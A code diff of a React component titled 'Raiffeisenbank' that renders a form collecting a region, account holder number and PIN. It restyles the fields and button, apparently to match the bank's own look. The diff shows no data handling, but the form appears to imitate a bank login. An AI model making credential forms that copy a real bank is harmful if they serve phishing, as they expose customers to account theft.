@@ -49,7 +49,7 @@ const Raiffeisenbank = () => {
         {/* Bundesland Select - Floating Label */}
         <div className="relative mb-4">
           <label
-            className={`pointer-events-none absolute left-0 transition-all duration-200 ${
+            className={`pointer-events-none absolute left-3 transition-all duration-200 ${
               selectLabelFloated
                 ? "top-1 text-xs text-gray-500"
                 : "top-3 text-sm text-gray-500"
@@ -62,7 +62,7 @@ const Raiffeisenbank = () => {
             onChange={(e) => setBundesland(e.target.value)}
             onFocus={() => setSelectFocused(true)}
             onBlur={() => setSelectFocused(false)}
-            className="w-full appearance-none border-b-2 border-gray-300 bg-transparent pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#1a1a1a]"
+            className="w-full appearance-none border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#1a1a1a]"
           >
             <option value="" disabled hidden></option>
             {bundeslaender.map((bl) => (
@@ -71,7 +71,7 @@ const Raiffeisenbank = () => {
               </option>
             ))}
           </select>
-          <div className="pointer-events-none absolute right-0 top-4">
+          <div className="pointer-events-none absolute right-3 top-4">
             <svg className="h-4 w-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
               <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
             </svg>
@@ -85,9 +85,9 @@ const Raiffeisenbank = () => {
             value={verfueger}
             onChange={(e) => setVerfueger(e.target.value)}
             placeholder=" "
-            className="peer w-full border-b-2 border-gray-300 bg-transparent pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#1a1a1a]"
+            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#1a1a1a]"
           />
-          <label className="pointer-events-none absolute left-0 top-3 text-sm text-gray-500 transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs">
+          <label className="pointer-events-none absolute left-3 top-3 text-sm text-gray-500 transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs">
             Verfügernummer eingeben <span className="text-gray-400">*</span>
           </label>
         </div>
@@ -100,21 +100,23 @@ const Raiffeisenbank = () => {
             value={pin}
             onChange={(e) => setPin(e.target.value)}
             placeholder=" "
-            className="peer w-full border-b-2 border-gray-300 bg-transparent pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#1a1a1a]"
+            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#1a1a1a]"
           />
-          <label className="pointer-events-none absolute left-0 top-3 text-sm text-gray-500 transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs">
+          <label className="pointer-events-none absolute left-3 top-3 text-sm text-gray-500 transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs">
             PIN eingeben <span className="text-gray-400">*</span>
           </label>
         </div>
 
         {/* Weiter Button */}
-        <button
-          type="button"
-          className="w-full rounded-md bg-[#FFC72C] py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6b325] disabled:opacity-50"
-          disabled={!bundesland || !verfueger || !pin}
-        >
-          Weiter
-        </button>
+        <div className="flex justify-center">
+          <button
+            type="button"
+            className="rounded-md bg-[#fbf315] px-12 py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6dc12] disabled:opacity-50"
+            disabled={!bundesland || !verfueger || !pin}
+          >
+            Weiter
+          </button>
+        </div>
       </div>
 
       {/* Footer */}
